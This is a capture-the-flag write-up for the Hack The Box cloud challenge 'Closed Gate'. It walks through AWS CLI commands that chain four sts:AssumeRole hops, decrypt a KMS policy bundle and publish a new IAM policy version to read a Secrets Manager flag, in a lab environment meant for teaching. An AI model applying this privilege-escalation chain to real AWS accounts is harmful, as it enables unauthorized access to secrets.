![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Closed Gate</font>

24<sup>th</sup> June 2026

Prepared By: `kangwijen`

Challenge Author(s): `kangwijen`

Difficulty: <font color='orange'>Medium</font>

<br><br>


# Synopsis

Closed Gate is a Medium Cloud Exploitation challenge that demonstrates SNS-to-SQS event correlation through a four-hop chained sts:AssumeRole privilege escalation and KMS-encrypted policy bundle recovery to publish a new IAM policy version that unlocks a downstream role's KMS decrypt access and reveals a Secrets Manager-held flag.

## Description

Rin Kagetsura finds that Vaultrune has sealed a small service gate below Crownspire's outer wall. Stormbound's medics and supply carts use that gate because the main road is watched, but Vaultrune has replaced the old lock with new parts and posted guards nearby. If the gate stays shut, the wounded inside the city lose their medicine and the soldiers at the east road lose their food. Rin cannot break the lock in front of the guards because they will seal the whole passage. She has to enter through an old maintenance tunnel, open the gate without leaving clear signs of a break-in, and get the supplies moving before nightfall.

## Skills Required

- AWS CLI basics
- SNS subscribe and SQS message correlation
- Chained `sts:AssumeRole` with `ExternalId` from live artifacts

## Skills Learned

- Correlating unlock notices and maintenance jobs before trusting a plate id
- Decrypting operator policy bundles with a dedicated policy CMK
- Publishing IAM policy versions to unlock KMS-enveloped Secrets Manager flags

# Enumeration

Use the instance IP and ports from your **instance card**. Open the briefing URL there for starting credentials and the shell setup snippet. Use AWS CLI v2, then export the environment variables shown in the briefing shell setup block. The `<AWS_PORT>` is the AWS API port from the instance card, not the briefing website port:

```bash
$ export AWS_ENDPOINT_URL=http://<CHALLENGE_IP>:<AWS_PORT>
$ export AWS_DEFAULT_REGION=us-east-1
$ export AWS_ACCESS_KEY_ID=<from briefing>
$ export AWS_SECRET_ACCESS_KEY=<from briefing>
$ unset AWS_SESSION_TOKEN
```

Once those are set every subsequent `aws` command uses the challenge endpoint automatically. Verify the starting identity:

```bash
$ aws sts get-caller-identity

{
    "UserId": "AIDAVSVU6LUUMQ64IHOB",
    "Account": "728491650384",
    "Arn": "arn:aws:iam::728491650384:user/registry-outer-clerk"
}
```

The briefing names `registry-plate-notify-queue`, `registry-maintenance-queue`, and `registry-plate-index`. Queue URLs take the form `${AWS_ENDPOINT_URL%/}/728491650384/<queue-name>`. The notify queue stays empty until the clerk subscribes it to a plate unlock topic. The clerk cannot read IAM policies or list roles. Later role ARNs and external ids come from the live DynamoDB row after queue correlation.

Enumerate available SNS topics to find the one the notify queue should subscribe to:

```bash
$ aws sns list-topics

{
    "Topics": [
        {
            "TopicArn": "arn:aws:sns:us-east-1:728491650384:registry-plate-sealed-notice"
        },
        {
            "TopicArn": "arn:aws:sns:us-east-1:728491650384:registry-plate-unlock"
        }
    ]
}
```

Two topics exist. The clerk policy grants `sns:Subscribe` only on `registry-plate-unlock`. Attempting to subscribe to `registry-plate-sealed-notice` returns `AccessDenied`. Use `registry-plate-unlock`.

# Solution

## Exploitation

### Step 1 - Subscribe to the plate unlock topic and read the notify queue

The briefing names `registry-plate-notify-queue` directly, so a read against it before touching anything else is the obvious first move:

```bash
$ aws sqs receive-message \
  --queue-url "${AWS_ENDPOINT_URL%/}/728491650384/registry-plate-notify-queue" \
  --max-number-of-messages 1 \
  --visibility-timeout 30

```

No `Messages` key comes back. An empty queue with no backlog means something has to trigger delivery before there is anything to read, and the clerk policy has no `sns:ListSubscriptions` permission to check what is already wired up. The two topics found during enumeration are the only candidates, and subscribing the notify queue to `registry-plate-sealed-notice` fails outright:

```bash
$ aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:728491650384:registry-plate-sealed-notice \
  --protocol sqs \
  --notification-endpoint arn:aws:sqs:us-east-1:728491650384:registry-plate-notify-queue

An error occurred (AccessDenied) when calling the Subscribe operation: User is not authorized to perform: sns:Subscribe
```

That leaves `registry-plate-unlock` as the only topic the clerk policy actually grants `sns:Subscribe` on:

```bash
$ aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:728491650384:registry-plate-unlock \
  --protocol sqs \
  --notification-endpoint arn:aws:sqs:us-east-1:728491650384:registry-plate-notify-queue

{
    "SubscriptionArn": "arn:aws:sns:us-east-1:728491650384:registry-plate-unlock:355d26f0-4346-4fca-8390-9bf8d4f34f8a"
}
```

A few seconds after that call, the same receive-message request that returned nothing now returns traffic. SNS wraps every delivered notice in its own envelope, and the field that actually matters sits one layer down inside `Message`:

```bash
$ aws sqs receive-message \
  --queue-url "${AWS_ENDPOINT_URL%/}/728491650384/registry-plate-notify-queue" \
  --max-number-of-messages 1 \
  --visibility-timeout 30

{
    "Messages": [
        {
            "MessageId": "afdac00a-fbef-4010-a5b3-4ffe69d09d4b",
            "ReceiptHandle": "<receipt-handle>",
            "MD5OfBody": "221209f453075462c0de0666a3cad293",
            "Body": "{\"Type\":\"Notification\",\"MessageId\":\"9e24ad15-fedd-4185-8cd1-ba65eda552da\",\"TopicArn\":\"arn:aws:sns:us-east-1:728491650384:registry-plate-unlock\",\"Timestamp\":\"2026-07-14T07:01:52.292033013Z\",\"Message\":\"{\\\"plate_id\\\": \\\"PLATE-B35F\\\", \\\"notice\\\": \\\"UNLOCK\\\", \\\"status\\\": \\\"HOLD\\\", \\\"lane\\\": \\\"outer-ring\\\"}\",\"MessageAttributes\":{}}"
        }
    ]
}
```

Parsing `Body` as JSON and then the nested `Message` string gives:

```json
{
  "plate_id": "PLATE-B35F",
  "notice": "UNLOCK",
  "status": "HOLD",
  "lane": "outer-ring"
}
```

A `notice` of `UNLOCK` looks promising for a moment, until the `status` field reads `HOLD` instead of anything active. Repeating the receive call and decoding each body the same way turns into a filtering exercise rather than a single lookup. Draining the full queue, 236 messages once every one of them has been pulled and parsed, turns up exactly one body where both fields line up:

```json
{
  "plate_id": "PLATE-4E8C",
  "notice": "UNLOCK",
  "status": "ACTIVE",
  "lane": "outer-ring"
}
```

`PLATE-4E8C` is the only plate id in that traffic with `status: ACTIVE`. Every other combination of plate id and status in the queue pairs live-sounding fields with a non-live status.

### Step 2 - Correlate the maintenance queue against the live plate

The briefing also names `registry-maintenance-queue`, readable by the same clerk credentials. With a confirmed live plate id in hand, draining this second queue and filtering for anything that references `PLATE-4E8C` is the natural next move:

```bash
$ aws sqs receive-message \
  --queue-url "${AWS_ENDPOINT_URL%/}/728491650384/registry-maintenance-queue" \
  --max-number-of-messages 1 \
  --visibility-timeout 30

{
    "Messages": [
        {
            "MessageId": "0d2e555a-7f56-4a93-a7b8-809beb5ee841",
            "ReceiptHandle": "<receipt-handle>",
            "MD5OfBody": "f5664c809635db74ba7a240162075bc4",
            "Body": "{\"plate_id\": \"PLATE-4E8C\", \"job_external_id\": \"stale-job-ext-4e8c\", \"job\": \"CUSTODY_AUDIT\", \"lane\": \"maintenance\"}"
        }
    ]
}
```

This body matches the live plate id, but the `job_external_id` is `stale-job-ext-4e8c`. The word "stale" is a strong signal that this particular value will not validate against IAM later. Continuing to drain the queue turns up a second row for the same plate with a different external id:

```bash
$ aws sqs receive-message \
  --queue-url "${AWS_ENDPOINT_URL%/}/728491650384/registry-maintenance-queue" \
  --max-number-of-messages 1 \
  --visibility-timeout 30

{
    "Messages": [
        {
            "MessageId": "41efdfa5-5d1f-43a2-95af-e40252c34635",
            "ReceiptHandle": "<receipt-handle>",
            "MD5OfBody": "065d08f3a0554a4153a4430e8bf991fa",
            "Body": "{\"plate_id\": \"PLATE-4E8C\", \"job_external_id\": \"registry-job-custody-4e8c\", \"job\": \"CUSTODY_AUDIT\", \"lane\": \"maintenance\"}"
        }
    ]
}
```

Two rows now share the same plate id, and only one external id can be correct. Across the full 251-message queue, `registry-job-custody-4e8c` is the only `job_external_id` paired with `PLATE-4E8C` that is not flagged stale, which makes it the value worth carrying into the first `AssumeRole` call. Requiring both queues to agree independently before either value gets used against IAM is what rules out relying on a single source.

### Step 3 - Load the DynamoDB plate index row

With a plate id and a job external id confirmed, the table named in the briefing, `registry-plate-index`, is worth a direct `GetItem` rather than a scan. The clerk policy does not allow listing or scanning the table freely, only reading a specific row by key, which is why the queue correlation had to happen first.

```bash
$ aws dynamodb get-item \
  --table-name registry-plate-index \
  --key '{"plate_id":{"S":"PLATE-4E8C"}}'

{
    "Item": {
        "plate_id": { "S": "PLATE-4E8C" },
        "status": { "S": "ACTIVE" },
        "cfn_stack": { "S": "registry-shard-stack-live" },
        "custody_external_id": { "S": "registry-job-custody-4e8c" },
        "indexer_external_id": { "S": "registry-indexer-relay-4e8c" },
        "verifier_external_id": { "S": "registry-verifier-bind-4e8c" },
        "custodian_external_id": { "S": "registry-custodian-seal-4e8c" },
        "policy_bundle_key": { "S": "bundles/live/registry-policy-bundle-4e8c.enc" },
        "policy_kms_key_id": { "S": "91ecd0f3-62d2-4ec2-91df-ec4c01c4e1dd" },
        "notes": { "S": "Live outer ring custody lane for crown shard verifier." },
        "custody_role_arn": { "S": "arn:aws:iam::728491650384:role/registry-custody-reader" },
        "indexer_role_arn": { "S": "arn:aws:iam::728491650384:role/registry-indexer" },
        "verifier_role_arn": { "S": "arn:aws:iam::728491650384:role/registry-verifier-runner" },
        "custodian_role_arn": { "S": "arn:aws:iam::728491650384:role/shard-custodian" },
        "artifacts_bucket": { "S": "registry-sealed-artifacts" },
        "notify_queue": { "S": "registry-plate-notify-queue" },
        "maintenance_queue": { "S": "registry-maintenance-queue" },
        "sns_topic": { "S": "registry-plate-unlock" }
    }
}
```

One row is worth far more than both queues combined. `status: ACTIVE` confirms what the notify queue already implied, and the same response lays out every role ARN and external id needed for the rest of the chain, plus a `policy_kms_key_id` and a `policy_bundle_key` pointing at an S3 object that has not been touched yet. On a fresh provision these UUIDs and object keys change, so the values above are specific to this run rather than fixed constants.

### Step 4 - Read CloudFormation stack outputs

`cfn_stack` points at `registry-shard-stack-live`. A CloudFormation stack's outputs are the standard place to expose values meant for other resources to consume, which makes them worth reading next:

```bash
$ aws cloudformation describe-stacks --stack-name registry-shard-stack-live

{
    "Stacks": [
        {
            "StackId": "arn:aws:cloudformation:us-east-1:728491650384:stack/registry-shard-stack-live/3917374e-6ebd-4c4b-a44a-9709efaa952c",
            "StackName": "registry-shard-stack-live",
            "CreationTime": "2026-07-14T07:00:43.262151+00:00",
            "StackStatus": "CREATE_COMPLETE",
            "Outputs": [
                {
                    "OutputKey": "ShardSecretName",
                    "OutputValue": "registry/shard/live-shard-4e8c"
                },
                {
                    "OutputKey": "ShardKmsKeyId",
                    "OutputValue": "18dc41a7-fb9c-494a-9997-e7de71bf228e"
                }
            ]
        }
    ]
}
```

Two outputs matter here: a Secrets Manager secret name, and a second KMS key id that is different from the `policy_kms_key_id` already pulled from DynamoDB. Two separate CMKs showing up this early is a hint that whatever decrypts the policy bundle later will not be the same key that decrypts the final secret.

### Step 5 - Assume `registry-custody-reader` (hop 1 of 4)

Everything gathered so far, the plate row's `custody_role_arn` and the maintenance queue's `job_external_id`, points at a single `AssumeRole` call:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/registry-custody-reader \
  --role-session-name outer-custody \
  --external-id registry-job-custody-4e8c

{
    "Credentials": {
        "AccessKeyId": "<CUSTODY_ACCESS_KEY_ID>",
        "SecretAccessKey": "<CUSTODY_SECRET_ACCESS_KEY>",
        "SessionToken": "<CUSTODY_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:03:13+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAN8A2LPKXZS0Z1XKM:outer-custody",
        "Arn": "arn:aws:sts::728491650384:assumed-role/registry-custody-reader/outer-custody"
    }
}
```

The trust policy on this role checks only the `ExternalId`, which is why neither the plate id nor the stale maintenance value from step 2 would have worked here. Exporting the returned credentials keeps the next calls scoped to this role instead of the original clerk identity:

```bash
$ export AWS_ACCESS_KEY_ID=<CUSTODY_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<CUSTODY_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<CUSTODY_SESSION_TOKEN>
```

### Step 6 - Download and decrypt the policy bundle

`registry-custody-reader` turns out to be scoped for one job: reading the sealed artifacts bucket and decrypting with the policy CMK. The bundle key pulled from DynamoDB, `bundles/live/registry-policy-bundle-4e8c.enc`, downloads without issue:

```bash
$ aws s3 cp \
  s3://registry-sealed-artifacts/bundles/live/registry-policy-bundle-4e8c.enc \
  /tmp/policy-bundle.enc

Completed 1.0 KiB/1.0 KiB
```

The object is ciphertext, not something usable on its own, so `kms:Decrypt` against the `policy_kms_key_id` from the plate row is the next call:

```bash
$ aws kms decrypt \
  --ciphertext-blob fileb:///tmp/policy-bundle.enc \
  --key-id 91ecd0f3-62d2-4ec2-91df-ec4c01c4e1dd \
  --output text \
  --query Plaintext | base64 -d > /tmp/bundle.json

$ cat /tmp/bundle.json

{
  "managed_policy_arn": "arn:aws:iam::728491650384:policy/ShardReaderPolicy",
  "policy_document": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "CallerIdentity",
        "Effect": "Allow",
        "Action": "sts:GetCallerIdentity",
        "Resource": "*"
      },
      {
        "Sid": "ReadLiveShardSecret",
        "Effect": "Allow",
        "Action": "secretsmanager:GetSecretValue",
        "Resource": "arn:aws:secretsmanager:us-east-1:728491650384:secret:registry/shard/live-shard-4e8c-*"
      },
      {
        "Sid": "DecryptLiveShard",
        "Effect": "Allow",
        "Action": "kms:Decrypt",
        "Resource": "arn:aws:kms:us-east-1:728491650384:key/18dc41a7-fb9c-494a-9997-e7de71bf228e"
      }
    ]
  }
}
```

This bundle is the actual payload the chain has been building toward: a managed policy ARN, `ShardReaderPolicy`, and a document that grants `GetSecretValue` and `kms:Decrypt` scoped to the shard secret and the shard CMK found in step 4. Holding this plaintext is not enough by itself, it is a policy document sitting on disk with no effect until it gets published somewhere. Extracting just the `policy_document` half into its own file sets up that publish:

```bash
$ python3 -c \
  "import json; d=json.load(open('/tmp/bundle.json')); json.dump(d['policy_document'], open('/tmp/shard-reader-policy.json','w'), indent=2)"
```

### Step 7 - Assume `registry-indexer` and publish `ShardReaderPolicy` (hop 2 of 4)

Still holding the custody-reader session, the plate row's `indexer_role_arn` and `indexer_external_id` chain into a second `AssumeRole`:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/registry-indexer \
  --role-session-name outer-indexer \
  --external-id registry-indexer-relay-4e8c

{
    "Credentials": {
        "AccessKeyId": "<INDEXER_ACCESS_KEY_ID>",
        "SecretAccessKey": "<INDEXER_SECRET_ACCESS_KEY>",
        "SessionToken": "<INDEXER_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:04:17+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROASSQWSTT4L8BV10ID:outer-indexer",
        "Arn": "arn:aws:sts::728491650384:assumed-role/registry-indexer/outer-indexer"
    }
}
```

```bash
$ export AWS_ACCESS_KEY_ID=<INDEXER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<INDEXER_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<INDEXER_SESSION_TOKEN>
```

The bundle's `managed_policy_arn` names `ShardReaderPolicy` directly, and the extracted document is the obvious payload for a new default version of that exact policy, so publishing it from this session is the next call worth trying:

```bash
$ aws iam create-policy-version \
  --policy-arn arn:aws:iam::728491650384:policy/ShardReaderPolicy \
  --policy-document file:///tmp/shard-reader-policy.json \
  --set-as-default

{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2026-07-14T07:04:39+00:00"
    }
}
```

The call succeeds, confirming `registry-indexer` carries `iam:CreatePolicyVersion` on this policy, a permission nowhere visible before trying it since this role has no self-read IAM access. This step is also easy to skip past without noticing why it matters. `ShardReaderPolicy` is attached to `shard-custodian` as a managed policy, and whatever version is marked default at the moment of the eventual secret read governs that call, not whatever version was default when the role was created. The original default version only grants `sts:GetCallerIdentity`, so assuming the custodian role without publishing this new version first would still succeed, it would just leave `GetSecretValue` denied at the very end. Publishing v2 now, while the indexer session is still active, means the custodian role already has the right permissions once the chain gets there.

### Step 8 - Assume `registry-verifier-runner` (hop 3 of 4)

The verifier role's trust policy checks only the `ExternalId`, the same pattern as every hop so far, and the indexer session is a valid caller for it:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/registry-verifier-runner \
  --role-session-name outer-verifier \
  --external-id registry-verifier-bind-4e8c

{
    "Credentials": {
        "AccessKeyId": "<VERIFIER_ACCESS_KEY_ID>",
        "SecretAccessKey": "<VERIFIER_SECRET_ACCESS_KEY>",
        "SessionToken": "<VERIFIER_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:04:50+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAFP8LPJGCA2L25CB7:outer-verifier",
        "Arn": "arn:aws:sts::728491650384:assumed-role/registry-verifier-runner/outer-verifier"
    }
}
```

```bash
$ export AWS_ACCESS_KEY_ID=<VERIFIER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<VERIFIER_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<VERIFIER_SESSION_TOKEN>
```

Nothing about this role looks directly useful for reading secrets or decrypting anything. It functions as a relay step, holding a trust relationship that the final role in the chain will accept as a valid caller.

### Step 9 - Assume `shard-custodian` (hop 4 of 4)

The last external id on the plate row, `custodian_external_id`, chains from the verifier session into the final role:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::728491650384:role/shard-custodian \
  --role-session-name outer-custodian \
  --external-id registry-custodian-seal-4e8c

{
    "Credentials": {
        "AccessKeyId": "<CUSTODIAN_ACCESS_KEY_ID>",
        "SecretAccessKey": "<CUSTODIAN_SECRET_ACCESS_KEY>",
        "SessionToken": "<CUSTODIAN_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:05:13+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAVW3MKER6BRVPJR2N:outer-custodian",
        "Arn": "arn:aws:sts::728491650384:assumed-role/shard-custodian/outer-custodian"
    }
}
```

```bash
$ export AWS_ACCESS_KEY_ID=<CUSTODIAN_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<CUSTODIAN_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<CUSTODIAN_SESSION_TOKEN>
```

Four hops deep, the role name and the bundle contents from step 6 both point at the same destination: the shard secret named in the CloudFormation output back in step 4.

### Step 10 - `GetSecretValue` and shard CMK decrypt

`GetSecretValue` against `registry/shard/live-shard-4e8c` now succeeds, where it would have been denied before the policy publish in step 7:

```bash
$ aws secretsmanager get-secret-value \
  --secret-id registry/shard/live-shard-4e8c

{
    "ARN": "arn:aws:secretsmanager:us-east-1:728491650384:secret:registry/shard/live-shard-4e8c-372UYX",
    "Name": "registry/shard/live-shard-4e8c",
    "VersionId": "e49e1840-eaa7-4ed3-a5a3-f54886c437be",
    "SecretBinary": "<base64 ciphertext>",
    "VersionStages": ["AWSCURRENT"]
}
```

The response carries `SecretBinary` instead of `SecretString`, so the flag was never stored as plain text, only as KMS-enveloped bytes. Two CMKs have been in play since step 4. Testing the policy CMK from DynamoDB against this envelope first rules out the simpler option before reaching for the shard CMK:

```bash
$ aws secretsmanager get-secret-value \
  --secret-id registry/shard/live-shard-4e8c \
  --query SecretBinary \
  --output text | base64 -d > /tmp/shard-cipher.bin

$ aws kms decrypt \
  --ciphertext-blob fileb:///tmp/shard-cipher.bin \
  --key-id 91ecd0f3-62d2-4ec2-91df-ec4c01c4e1dd \
  --output text \
  --query Plaintext

An error occurred (AccessDeniedException) when calling the Decrypt operation: User is not authorized to perform: kms:Decrypt
```

The policy CMK only ever unlocked the S3 bundle back in step 6, and `ShardReaderPolicy` never granted decrypt rights against it. Swapping in the `ShardKmsKeyId` output from the CloudFormation stack, the value that matches the `DecryptLiveShard` statement published in step 7, is what actually works:

```bash
$ aws kms decrypt \
  --ciphertext-blob fileb:///tmp/shard-cipher.bin \
  --key-id 18dc41a7-fb9c-494a-9997-e7de71bf228e \
  --output text \
  --query Plaintext | base64 -d

HTB{REDACTED}
```

### Getting the flag

The path from a read-only clerk identity to this flag runs through ten dependent calls, and none of them were guessable in isolation. Each one only became possible because of what the previous call revealed.

1. `sns:ListTopics` surfaces two candidate topics. Only `registry-plate-unlock` accepts `sns:Subscribe` from the clerk policy, and wiring it to `registry-plate-notify-queue` starts live notification traffic flowing.
2. Draining the notify queue's 236 messages down to the single body with `notice: UNLOCK` and `status: ACTIVE` fixes the live plate id at `PLATE-4E8C`.
3. Draining the maintenance queue's 251 messages down to the row that shares both `plate_id` and a non-stale `job_external_id` with that plate confirms `registry-job-custody-4e8c` as the value the first `AssumeRole` needs.
4. `dynamodb:GetItem` on that plate id returns every role ARN, external id, and bundle pointer needed for the rest of the chain in one response.
5. `cloudformation:DescribeStacks` on the plate row's `cfn_stack` value returns a shard secret name and a second KMS key id that only turns out to matter at the very end.
6. Hop 1, `sts:AssumeRole` on `registry-custody-reader` with the maintenance queue's external id, unlocks `s3:GetObject` on the sealed policy bundle and `kms:Decrypt` with the DynamoDB row's policy CMK.
7. The decrypted bundle contains a policy document for `ShardReaderPolicy`. Hop 2, `sts:AssumeRole` on `registry-indexer`, carries `iam:CreatePolicyVersion` rights that publish that document as the policy's new default version, which is what eventually lets `shard-custodian` read the secret.
8. Hop 3, `sts:AssumeRole` on `registry-verifier-runner`, adds nothing directly usable but is a required relay in the trust chain toward the final role.
9. Hop 4, `sts:AssumeRole` on `shard-custodian`, is now backed by the freshly published policy version instead of the original one that only allowed `sts:GetCallerIdentity`.
10. `secretsmanager:GetSecretValue` on `registry/shard/live-shard-4e8c` returns KMS-enveloped bytes in `SecretBinary`. The policy CMK from step 6 is denied against this ciphertext, and only the shard CMK from step 4's CloudFormation output decrypts it into the flag.

- Answer: `HTB{REDACTED}`
